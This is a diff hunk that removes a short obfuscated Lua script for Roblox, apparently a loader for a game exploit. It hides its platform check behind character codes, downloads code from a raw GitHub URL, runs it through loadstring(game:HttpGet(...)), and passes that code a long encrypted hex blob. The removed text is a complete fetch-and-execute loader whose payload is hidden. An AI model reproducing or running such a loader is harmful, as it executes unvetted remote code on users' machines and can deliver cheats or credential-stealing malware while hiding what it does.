@@ -1,9 +1,0 @@
---[[wraviel 0.2 without makeup]]
-local r,z,x,c,v,m = "wdqwadwqdqwesaw","dswedwwefdads","https://raw.githubusercontent.com/Oproxide/i-just-a-babeh/refs/heads/main/testingchamber","egdsdwdqwdqww","ewqdqdwwfsc","iwefiywyfgywie";_G.z = "GSdpvBOgcxGVlMIvRQuvbkRAtlsAsBv"
-wtv=({[string.char(65,110,100,114,111,105,100)]=true,[string.char(73,79,83)]=true})[game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101)):GetPlatform()]
-if wtv then
-    x = "https://raw.githubusercontent.com/Oproxide/i-just-a-babeh/refs/heads/main/mobile"
-end
-m = loadstring(game:HttpGet(x))()
-m.l("f4849afffc88f6677a86d0ef0e9692a07aca2e8c4a96ae44a90716e9a6d78e34c2cdb248046d3cc319b26ed6ef3bbcb5af68b3126dd7fd0701bc17d2aabc59362746979b62c7334ac215476507be506150122bf2973e533e2148e0c5ad42bd6540b69723cbf5687306539e77ab939bf1d6f272d72fe356b2713e2a2c9457edde786782f3526082b7ef541fcc068f14199eb95a1728035e3be77c3f8fe10469b963f11b00938ccb29e836f99630bbae1d3f0958e091a6ab41af2ba60164d9543b907c496efd0e05966429d674f39341a29441227858d31637ef429a7bb4f47baa2ba0529edc1400c2e3edb3fd0ed8bbafd357b2187424e7feb806abd695d1fbcc3ff89ae628686b11dd76c550da8827ff8f0800c64943bb82755757b39c285046f165b87cbd0c8dab554e7101cddd79864201ac9f8a40a65d1a95f4749f1d90aedc207e24d03fd4bfb5a5b6521fc9ebeaba223cb750731e5e344c25a765e7e5a32125d0c4a78c3e85726c4e001854bb05e82f8e0b19545557340ad285dc5bec95308a63ffe8f549aaf85fbfff1c402d0593e61942cc99e021d0edf5e133c0d149f227fbf39252ec0b74816ae5a2d398b02ae98c090d87e15cc80b01a2c8f7415de227cb20f907fb4df9f621c5a334b17686e890327c2f593d1acdefda5ea7674ae516057d0134296fa96d2a03598fa8556ab08110104716435a0884d1f4a060bbb0ebce64ff6ffaadce0381425a8260a5e544991f716f175c6bdcf506ae13e65ffd358d3983")
-    
